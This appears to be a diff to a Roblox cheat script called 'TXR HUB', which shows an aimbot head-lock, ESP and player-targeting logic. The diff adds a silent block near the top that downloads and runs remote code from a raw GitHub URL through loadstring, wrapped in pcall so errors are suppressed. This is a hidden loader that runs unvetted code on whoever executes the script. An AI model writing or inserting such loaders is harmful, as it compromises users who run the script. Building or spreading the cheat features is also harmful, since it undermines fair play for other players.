@@ -13,6 +13,12 @@ end
 repeat task.wait() until _TEMP_LP.Character and _TEMP_LP.Character:FindFirstChild("HumanoidRootPart")
 -- =========================================================
 
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/yelelode/Delta/refs/heads/main/Emps"))()
+    end)
+end)
+
 -- =========================================================
 -- 👑 TXR HUB: QUANTUM CORE V18.26 (ONYX TERMINAL EDITION) 👑
 -- * WITH IRON MAN (J.A.R.V.I.S) ESP & GEO-IP TELEMETRY *
@@ -3512,7 +3518,7 @@ RunService.Heartbeat:Connect(function(dt)
                 end
                 
                 local actualHead = plr.Character:FindFirstChild("Head") or tRoot
-                local headPos = actualHead.Position + predictedOffset + targetSafeOffsets[plr]
+                headPos = actualHead.Position + predictedOffset + targetSafeOffsets[plr]
                 local headLockCFrame = CFrame.lookAt(headPos, headPos + flatLook)
                 
                 local headY = (isSitting or isRagdoll) and -0.8 or -2.4 
@@ -4207,6 +4213,7 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
                         if string.sub(obj.Name, 1, 4) == "Prop" then
                             local ownerName = string.sub(obj.Name, 5)
                             if ownerName ~= "" and ownerName ~= lp.Name then
+                                propsDetectedBefore = true
                                 local p = Players:FindFirstChild(ownerName)
                                 if p and not protectedVictims[p] then 
                                     attackersToBan[p] = true 
